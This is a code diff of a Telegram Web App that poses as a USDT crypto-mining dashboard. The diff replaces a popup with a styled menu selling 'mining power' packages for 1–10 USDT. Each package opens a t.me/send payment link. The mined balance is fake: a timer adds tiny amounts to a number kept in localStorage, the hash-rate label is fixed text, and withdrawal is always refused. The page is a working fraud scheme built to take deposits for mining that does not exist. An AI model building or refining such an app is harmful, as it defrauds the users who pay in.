@@ -6,21 +6,29 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; overflow: hidden; user-select: none; }
-        .balance { font-size: 48px; font-weight: bold; margin-top: 50px; color: #fff; }
+        .balance { font-size: 48px; font-weight: bold; margin-top: 50px; color: #fff; cursor: pointer; }
         .usdt { font-size: 18px; color: #888; margin-bottom: 10px; }
         .stat-card { display: flex; justify-content: space-around; background: #111; padding: 15px; border-radius: 15px; margin: 25px 0; border: 1px solid #222; }
         .stat-item { text-align: center; }
         .stat-label { color: #888; font-size: 10px; text-transform: uppercase; display: block; margin-bottom: 5px; }
         .stat-value { color: #fff; font-weight: bold; font-size: 16px; }
         .divider { width: 1px; background: #222; }
-        button { background: #fff; color: #000; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; }
-        button:active { transform: scale(0.98); opacity: 0.8; }
+        
+        /* Кнопки */
+        button { background: #fff; color: #000; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; margin-bottom: 10px; cursor: pointer; }
         .btn-withdraw { background: #1a1a1a; color: #555; }
+
+        /* Красивое меню выбора (вместо системного окна) */
+        #shop-menu { display: none; position: fixed; bottom: 0; left: 0; right: 0; background: #111; padding: 20px; border-top: 2px solid #333; border-radius: 20px 20px 0 0; z-index: 100; }
+        .shop-item { background: #222; padding: 12px; border-radius: 10px; margin-bottom: 10px; text-align: left; display: flex; justify-content: space-between; align-items: center; border: 1px solid #333; }
+        .shop-text { font-size: 14px; }
+        .shop-price { color: #00ff88; font-weight: bold; }
+        .close-shop { color: #888; font-size: 12px; margin-top: 10px; display: block; }
     </style>
 </head>
 <body>
     <div class="usdt">USDT BALANCE</div>
-    <div class="balance" id="balance" onclick="tg.showAlert('Майнинг идет успешно! Ожидайте начисления.')">0.000000</div>
+    <div class="balance" id="balance" onclick="tg.showAlert('Майнинг активен!')">0.000000</div>
     <div style="color: #00ff88; font-size: 14px; margin-top: 5px;">● Mining Active: 1.25 TH/s</div>
 
     <div class="stat-card">
@@ -35,41 +43,49 @@
         </div>
     </div>
 
-    <button onclick="deposit()">DEPOSIT</button>
-    <button class="btn-withdraw" onclick="tg.showAlert('Минимальная сумма вывода — 10 USDT. На вашем балансе пока недостаточно средств.')">WITHDRAW</button>
+    <button onclick="openShop()">DEPOSIT</button>
+    <button class="btn-withdraw" onclick="tg.showAlert('Недостаточно средств для вывода (мин. 10 USDT)')">WITHDRAW</button>
+
+    <div id="shop-menu">
+        <b style="display:block; margin-bottom:15px;">Ускорение майнинга 🚀</b>
+        <div class="shop-item" onclick="buy()">
+            <div class="shop-text">💎 Эконом<br><small style="color:#888">+1.25 TH/s</small></div>
+            <div class="shop-price">1 USDT</div>
+        </div>
+        <div class="shop-item" onclick="buy()">
+            <div class="shop-text">🔥 Стандарт<br><small style="color:#888">+7.00 TH/s</small></div>
+            <div class="shop-price">5 USDT</div>
+        </div>
+        <div class="shop-item" onclick="buy()">
+            <div class="shop-text">👑 VIP Пакет<br><small style="color:#888">+15.0 TH/s</small></div>
+            <div class="shop-price">10 USDT</div>
+        </div>
+        <span class="close-shop" onclick="closeShop()">ЗАКРЫТЬ</span>
+    </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
         
         let bal = parseFloat(localStorage.getItem('m_bal')) || 0.000000;
-
         setInterval(() => {
             bal += 0.000001;
             document.getElementById('balance').innerText = bal.toFixed(6);
             localStorage.setItem('m_bal', bal);
         }, 1000);
 
-        function deposit() {
-            tg.showPopup({
-                title: 'Ускорение майнинга 🚀',
-                message: 'Выберите пакет мощности:\n\n' +
-                         '💎 Эконом: 1 USDT = +1.25 TH/s\n' +
-                         '🔥 Стандарт: 5 USDT = +7.00 TH/s\n' +
-                         '👑 VIP: 10 USDT = +15.00 TH/s\n\n' +
-                         'Доход зачисляется автоматически!',
-                buttons: [
-                    {id: 'buy', type: 'default', text: 'КУПИТЬ МОЩНОСТЬ'},
-                    {type: 'cancel', text: 'ПОЗЖЕ'}
-                ]
-            }, (buttonId) => {
-                if (buttonId === 'buy') {
-                    // Твоя проверенная ссылка
-                    tg.openTelegramLink("http://t.me/send?start=IVpCqF6v6P8R"); 
-                }
-                // Исправляем "залипание" кнопки через обновление
-                setTimeout(() => { location.reload(); }, 500);
-            });
+        function openShop() {
+            document.getElementById('shop-menu').style.display = 'block';
+        }
+
+        function closeShop() {
+            document.getElementById('shop-menu').style.display = 'none';
+        }
+
+        function buy() {
+            // Твоя ссылка, которую ты прислал последней
+            tg.openTelegramLink("http://t.me/send?start=IVubelJ5G9NB");
+            closeShop();
         }
     </script>
 </body>
